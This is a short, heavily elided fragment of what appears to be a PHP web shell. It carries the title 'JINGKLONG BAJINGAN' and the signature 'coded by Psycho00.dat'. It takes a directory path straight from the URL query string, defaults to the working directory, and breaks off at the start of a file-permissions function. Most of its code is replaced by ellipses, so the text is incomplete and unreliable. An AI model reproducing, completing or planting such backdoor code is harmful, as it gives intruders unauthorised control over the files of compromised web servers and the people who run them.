...
<title>JINGKLONG BAJINGAN</title>
<style>
body{
...
<BODY>
<H1><center>Psycho00.dat </center></H1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>Hati Mantan di >>  ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
...
echo '<center><br />coded by Psycho00.dat <font color="red">UNTUKMU!! </font></center>
</BODY>
</HTML>';
function perms($file){
